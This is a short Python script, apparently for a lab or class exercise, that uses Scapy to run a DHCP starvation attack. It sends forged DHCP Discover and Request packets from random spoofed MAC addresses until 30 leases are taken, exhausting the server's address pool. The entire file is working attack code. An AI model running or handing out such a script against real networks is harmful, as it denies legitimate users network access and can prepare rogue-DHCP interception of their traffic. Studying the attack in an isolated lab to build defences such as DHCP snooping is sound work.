#!/usr/bin/python3
from time import sleep

import options as options
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import scapy.packet

conf.checkIPaddr = False  # Disabling the IP address checking



Flooded = False
Entries = 0


while Flooded == False: #Continues to loop till the leasing table is filled

    #In some cases, DHCP offered messages could not be sniffed by Scapy ---> Would result in an error, thus the try and except

    try:
        mac_addr = str(RandMAC()) #Generate a random MAC address

 
        DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=mac_addr, type=0x0800) \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(dport=67,sport=68) \
                    / BOOTP(op=1, chaddr=mac_addr) \
                    / DHCP(options=[('message-type','discover'), ('end')]) #Craft a DHCP Discover Message

        sendp(DHCP_DISCOVER, iface='eth0',verbose=1 ) #Sends DHCP Discover message to the router



        rcv_pkt= sniff(filter='udp and (port 67 or port 68)', timeout=10)
        print(rcv_pkt)
        off_ip = rcv_pkt[0].getlayer(BOOTP).yiaddr #Gets the offered IP from the router
        print("Offered IP:" + off_ip)

     
        pkt = Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr=mac_addr)
        pkt /= DHCP(options=[("message-type", "request"),
                             ("requested_addr", off_ip),
                             ("end")]) #Craft a DHCP Request Message

        sendp(pkt, iface='eth0',verbose=1 ) #Sends DHCP Request message to the router
        print("Request IP:" + off_ip)

        Entries +=1
        if Entries == 30: #Number of entries available to flood
            Flooded = True
    except:
        Entries += 0 
